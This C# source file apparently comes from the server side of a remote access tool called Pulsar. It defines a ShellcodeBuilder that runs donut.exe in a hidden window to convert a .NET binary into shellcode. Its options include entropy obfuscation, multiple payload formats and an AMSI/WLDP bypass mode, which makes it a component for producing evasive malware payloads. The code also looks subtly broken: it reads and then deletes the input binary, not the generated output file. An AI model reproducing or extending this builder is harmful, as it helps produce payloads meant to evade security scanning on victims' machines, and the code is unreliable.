using System;
using System.Diagnostics;
using System.IO;
using System.Collections.Generic;

namespace Pulsar.Server.Helper
{
    public enum EntropyLevel
    {
        None = 1,
        Random = 2,
        RandomSymmetric = 3
    }

    public enum Architecture
    {
        x86 = 1,
        amd64 = 2,
        Both = 3
    }

    public enum Format
    {
        Binary = 1,
        Base64 = 2,
        C = 3,
        Ruby = 4,
        Python = 5,
        Powershell = 6,
        CSharp = 7,
        Hex = 8
    }

    public enum Compress
    {
        None = 1,
        aPLib = 2,
        LZNT1 = 3,
        Xpress = 4
    }

    public enum Bypass
    {
        None = 1,
        Abort = 2,
        Continue = 3
    }

    public enum Headers
    {
        Overwrite = 1,
        Keep = 2
    }

    public static class ShellcodeBuilder
    {
        public static byte[] GenerateShellcode(
            string binaryPath,
            string entryClass,
            string entryMethod,
            string outputBinPath,
            bool deleteOutput = true,
            string donutExePath = "",
            string clrVersion = "",
            EntropyLevel entropy = EntropyLevel.RandomSymmetric,
            Architecture arch = Architecture.Both,
            Format format = Format.Binary,
            Compress compression = Compress.None,
            Bypass bypass = Bypass.Continue,
            Headers headers = Headers.Overwrite
        )
        {
            if (string.IsNullOrEmpty(donutExePath))
                donutExePath = Path.Combine(Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location), "donut.exe");
            if (!File.Exists(donutExePath))
                throw new FileNotFoundException("donut.exe not found", donutExePath);
            if (!File.Exists(binaryPath))
                throw new FileNotFoundException("Input Binary not found", binaryPath);

            List<String> args = new List<String>
            {
                $"-e {(int)entropy}",
                $"-a {(int)arch}",
                $"-i {binaryPath}",
                $"-c {entryClass}",
                $"-m {entryMethod}",
                $"-o {outputBinPath}",
                $"-f {(int)format}",
                $"-z {(int)compression}",
                $"-b {(int)bypass}",
                $"-k {(int)headers}",
            };
            if (!string.IsNullOrEmpty(clrVersion))
            {
                args.Add($"-r {clrVersion}");
            }
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = donutExePath,
                Arguments = string.Join(" ", args),
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            using (Process proc = Process.Start(psi))
            {
                proc.WaitForExit();
                if (proc.ExitCode != 0)
                {
                    var stdout = proc.StandardOutput.ReadToEnd();
                    var stderr = proc.StandardError.ReadToEnd();
                    throw new InvalidOperationException(
                        $"Donut failed (exit {proc.ExitCode})\nSTDOUT: {stdout}\nSTDERR: {stderr}"
                    );
                }
            }
            try
            {
                byte[] bytes = File.ReadAllBytes(binaryPath);
                if (deleteOutput)
                {
                    File.Delete(binaryPath);
                }
                return bytes;
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException(
                    $"Failed to read generated shellcode!"
                );
            }
        }
    }
}
